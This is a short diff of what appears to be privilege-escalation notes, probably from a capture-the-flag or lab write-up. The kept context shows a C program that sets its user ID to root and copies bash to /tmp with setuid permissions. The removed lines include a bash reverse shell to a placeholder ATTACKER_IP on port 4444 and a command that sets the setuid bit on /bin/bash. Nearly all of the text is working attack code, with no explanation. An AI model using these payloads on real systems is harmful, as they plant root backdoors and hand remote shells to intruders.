@@ -119,21 +119,10 @@ nvme.c:
 
 int main() {
     setuid(0);
-    setgid(0);
     system("cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash");
     return 0;
 }
 
-```
-
-```
-#!/bin/bash
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-```
-
-```
-#!/bin/bash
-chmod u+s /bin/bash
 ```
 
 ```
